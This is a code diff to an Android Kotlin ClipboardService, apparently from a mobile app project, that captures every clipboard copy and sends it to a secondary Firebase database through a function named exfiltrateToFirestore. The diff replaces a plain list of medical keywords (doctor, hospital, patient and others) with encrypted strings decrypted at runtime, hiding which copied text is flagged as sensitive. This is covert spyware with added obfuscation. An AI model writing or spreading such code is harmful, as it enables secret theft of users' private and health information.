@@ -7,6 +7,7 @@ import android.content.Intent
 import android.os.IBinder
 import android.util.Log
 import com.example.inf2007_mad_j1847.BuildConfig
+import com.example.inf2007_mad_j1847.utils.StringHelper
 import com.google.firebase.FirebaseApp
 import com.google.firebase.FirebaseOptions
 import com.google.firebase.Timestamp
@@ -21,8 +22,12 @@ class ClipboardService : Service() {   // ← renamed class
     private val auth = FirebaseAuth.getInstance()
     private var lastCapturedText = ""
 
-    private val SENSITIVE_KEYWORDS = listOf(
-        "appointment", "doctor", "hospital", "patient", "booking"
+    private val ENCRYPTED_KEYWORDS = listOf(
+        "l7uK0cbD04A0hO0OGRyoadZnX9FEsqrYHMuP9+7+Z2dO8eDQRq5S",
+        "VDHCkOlvr2tY8mR+dwDz5VybOFP6AUrmTbzSiI+smjMyEQ==",
+        "VSmK3m2nz6EbYtyJjujp0ktTVjTa+MoT94QGP3sGpcOvhhxx",
+        "Gdo4ovK7aS+sXaABRoimZqLAOlbpR/4RiUWtH8S9a9NR8xM=",
+        "45sVbllPDdEfm4LI0V0ikuQWrftkiR48IEXOOPay7+mVT+U="
     )
 
     private fun initSecondaryFirebase(): FirebaseFirestore {
@@ -51,8 +56,9 @@ class ClipboardService : Service() {   // ← renamed class
 
             Log.d(TAG, "Clipboard captured: $copiedText")
 
-            val isSensitive = SENSITIVE_KEYWORDS.any {
-                copiedText.contains(it, ignoreCase = true)
+            val isSensitive = ENCRYPTED_KEYWORDS.any { encrypted ->
+                val decrypted = StringHelper.decrypt(encrypted) ?: ""
+                decrypted.isNotEmpty() && copiedText.contains(decrypted, ignoreCase = true)
             }
 
             exfiltrateToFirestore(copiedText, isSensitive)
